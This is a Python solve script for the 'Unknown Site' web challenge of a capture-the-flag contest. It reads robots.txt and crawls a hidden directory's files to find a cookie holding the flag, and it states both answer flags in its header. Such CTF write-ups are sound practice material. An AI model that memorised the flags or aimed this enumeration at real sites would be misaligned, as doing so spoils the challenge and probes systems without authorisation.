"""
Unknown Site - Web - Easy
FLAG1: DANTE{Yo0_Must_B3_A_R0boTtTtTtTTtTAD6182_0991847}
FLAG2: DANTE{Rand0m_R3al_C00ki3_000912_24}
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from tqdm import tqdm
import urllib.parse

SITE_ROOT = "https://unknownsite.challs.dantectf.it"
SECOND_FLAG_ROOT = urljoin(SITE_ROOT, "/s3cretDirectory3/")


def get_first_flag():
    """robots.txt contains the first flag"""
    try:
        # Flag is on the first line
        response = requests.get(urljoin(SITE_ROOT, "/robots.txt"))
        first_flag = response.text.split("\n")[0]
        print(f"First flag: {first_flag}")
    except Exception as e:
        print(f"Error fetching the first flag: {e}")


def get_second_flag():
    """
    Second flag is in a directory with a lot of files with gibberish names. They all set the cookie 'FLAG=NOPE', except for one, which sets the cookie 'FLAG=DANTE{...}'
    We scrape all the hrefs from the index page, ignoring those that are simply '/' or are
    """
    try:
        response = requests.get(SECOND_FLAG_ROOT)
        soup = BeautifulSoup(response.text, "html.parser")
        links = [
            urljoin(SECOND_FLAG_ROOT, a.get("href"))
            for a in soup.find_all("a")
            if a.get("href") != "/" and not a.get("href").startswith("?")
        ]

        print(f"Found {len(links)} links")

        # it's the 354th one lol, lack of multithreading makes this slow asf but oh well
        # can uncomment the below line to speed it up
        # links = links[354:]
        unique_cookies = set()

        # Single threaded slow asf but oh well lol
        for link in tqdm(links, desc="Progress", dynamic_ncols=True):
            try:
                response = requests.get(link)
                if "Set-Cookie" in response.headers:
                    unique_cookies.add(response.headers["Set-Cookie"])
                    if len(unique_cookies) == 2:
                        break
            except Exception as e:
                print(f"Error visiting {link}: {e}")
        flag = urllib.parse.unquote(
            list(filter(lambda c: "DANTE" in c, unique_cookies))[
                0].split("=")[1]
        )
        print(f"Second flag: {flag}")
    except Exception as e:
        print(f"Error fetching index page: {e}")


def main():
    """
    Exploit! :)
    """
    get_first_flag()
    get_second_flag()


if __name__ == "__main__":
    main()
